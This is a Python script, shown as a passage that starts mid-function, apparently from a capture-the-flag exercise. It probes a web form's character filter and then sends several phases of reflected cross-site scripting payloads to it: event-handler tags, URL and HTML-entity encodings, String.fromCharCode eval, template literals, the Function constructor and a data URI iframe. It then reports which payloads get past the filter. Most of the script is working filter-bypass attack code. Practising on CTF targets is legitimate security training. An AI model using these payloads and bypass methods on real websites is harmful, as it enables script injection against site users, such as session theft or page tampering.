    """Send payload and check response"""
    data = {'name': payload}
    response = requests.post(target + endpoint, data=data)
    
    has_filter = "Sorry you can't use:" in response.text
    filter_match = re.search(r"Sorry you can't use: '([^']+)'", response.text)
    blocked_content = filter_match.group(1) if filter_match else None
    
    is_reflected = payload in response.text
    has_flag = bool(re.search(r'FLAG\{[^}]+\}', response.text))
    
    # Check for flag in response
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    
    print(f"\n=== {test_name} ===")
    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    print(f"Filter Warning: {has_filter}")
    if blocked_content:
        print(f"Blocked: '{blocked_content}'")
    print(f"Reflected: {is_reflected}")
    print(f"Flag Found: {has_flag}")
    if flag_matches:
        print(f"FLAG(S): {flag_matches}")
    
    return {
        'test_name': test_name,
        'payload': payload,
        'status_code': response.status_code,
        'has_filter': has_filter,
        'blocked_content': blocked_content,
        'is_reflected': is_reflected,
        'has_flag': has_flag,
        'flag_matches': flag_matches,
        'response_text': response.text if (is_reflected or has_flag) else None
    }

print("=" * 60)
print("FILTER FINGERPRINTING - Phase 1")
print("=" * 60)

# Fingerprint exactly what's blocked
fingerprint_results = []

# Test individual characters likely to be blocked
test_chars = ['<', '>', '"', "'", 'a', 'A', 's', 'S', 'c', 'C', 'r', 'R', 'i', 'I', 'p', 'P', 't', 'T', 'o', 'O', 'n', 'N']
for char in test_chars:
    result = send_payload(char, f"Character Test: '{char}'")
    fingerprint_results.append(result)

print("\n" + "=" * 60)
print("XSS PAYLOAD TESTING - Phase 2")
print("=" * 60)

# Test payloads WITHOUT using letter 'a' (to avoid filter)
xss_payloads = [
    # Using img tag with onerror (no 'a' in alert - use prompt/confirm)
    ("<img src=x onerror=confirm(1)>", "No-a img payload"),
    ("<img src=x onerror=prompt(1)>", "No-a img prompt"),
    
    # Using svg (svg has 'a' - avoid if blocked)
    ("<svg onload=confirm(1)>", "No-a svg payload"),
    
    # Using body
    ("<body onload=confirm(1)>", "No-a body payload"),
    
    # Using iframe
    ("<iframe src=x onerror=confirm(1)>", "No-a iframe payload"),
    
    # Using details
    ("<details open ontoggle=confirm(1)>", "No-a details payload"),
    
    # Using textarea with autofocus
    ("<textarea autofocus onfocus=confirm(1)>", "No-a textarea payload"),
    
    # Using input with autofocus
    ("<input autofocus onfocus=confirm(1)>", "No-a input payload"),
    
    # Using select
    ("<select autofocus onfocus=confirm(1)>", "No-a select payload"),
]

xss_results = []
for payload, name in xss_payloads:
    result = send_payload(payload, name)
    xss_results.append(result)

print("\n" + "=" * 60)
print("ENCODING BYPASS TESTING - Phase 3")
print("=" * 60)

# Test with HTML entity encoding for 'a'
encoded_payloads = [
    # HTML entity for 'a' = &#97; or &#x61;
    ("<img src=x onerror=confirm(1)>", "Base (no encoding)"),
    
    # URL encode critical chars
    ("%3Cimg%20src%3Dx%20onerror%3Dconfirm(1)%3E", "URL encoded"),
    
    # Double URL encode
    ("%253Cimg%2520src%253Dx%2520onerror%253Dconfirm(1)%253E", "Double URL encoded"),
    
    # HTML entity encode
    ("&#60;img src=x onerror=confirm(1)&#62;", "HTML entity < >"),
    
    # Hex entity encode
    ("&#x3C;img src=x onerror=confirm(1)&#x3E;", "Hex entity < >"),
    
    # Try without < > using autofocus tricks
    ("\" onfocus=confirm(1) autofocus \"", "Attribute injection"),
]

encoding_results = []
for payload, name in encoded_payloads:
    result = send_payload(payload, name)
    encoding_results.append(result)

print("\n" + "=" * 60)
print("ADVANCED BYPASS TESTING - Phase 4")
print("=" * 60)

# Test with String.fromCharCode for words containing 'a'
advanced_payloads = [
    # Using Unicode escapes in JavaScript
    ("<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "String.fromCharCode alert"),
    
    # Using eval with concatenation
    ("<img src=x onerror=eval('aler'%2b't(1)')>", "String concat eval"),
    
    # Using template literals
    ("<img src=x onerror=alert`1`>", "Template literal"),
    
    # Using Function constructor
    ("<img src=x onerror=Function('confirm(1)')()>", "Function constructor"),
    
    # Without event handler - just tag injection
    ("<script>confirm(1)</script>", "Script tag (will likely fail)"),
    
    # Using malformed closing
    ("<svg onload=confirm(1)//", "No closing tag"),
    
    # Using data URI
    ("<iframe src=data:text/html,<img src=x onerror=confirm(1)>>", "Data URI iframe"),
]

advanced_results = []
for payload, name in advanced_payloads:
    result = send_payload(payload, name)
    advanced_results.append(result)

print("\n" + "=" * 60)
print("SUMMARY & ANALYSIS")
print("=" * 60)

# Analyze which characters are actually blocked
blocked_chars = []
for r in fingerprint_results:
    if r['has_filter'] and len(r['payload']) == 1:
        blocked_chars.append(r['payload'])

print(f"\n[+] BLOCKED CHARACTERS: {blocked_chars}")

# Count successful reflections (payload appears in response)
successful_reflections = [r for r in xss_results + encoding_results + advanced_results if r['is_reflected']]
print(f"[+] SUCCESSFUL REFLECTIONS: {len(successful_reflections)}")

for sr in successful_reflections:
    print(f"  - {sr['test_name']}: {sr['payload']}")

# Check for flags
all_flags = []
all_results = fingerprint_results + xss_results + encoding_results + advanced_results
for r in all_results:
    if r['has_flag']:
        all_flags.extend(r['flag_matches'])

if all_flags:
    print(f"\n[!] FLAGS FOUND: {all_flags}")
    print("[!] Check detailed output above for flag context")
else:
    print("\n[-] No FLAG{} patterns found in any response")

# Find working bypasses
working_bypasses = []
for r in successful_reflections:
    if not r['has_filter']:
        working_bypasses.append(r)

if working_bypasses:
    print(f"\n[!] VULNERABILITY CONFIRMED!")
    print(f"[-] {len(working_bypasses)} working XSS payloads without filter warnings")
    for wb in working_bypasses[:3]:  # Show first 3
        print(f"  - {wb['test_name']}")
        print(f"    Payload: {wb['payload'][:100]}")
else:
    print("\n[!] Filter appears to be catching most payloads")
    print("[!] Need more sophisticated bypass techniques")

print("\n" + "=" * 60)

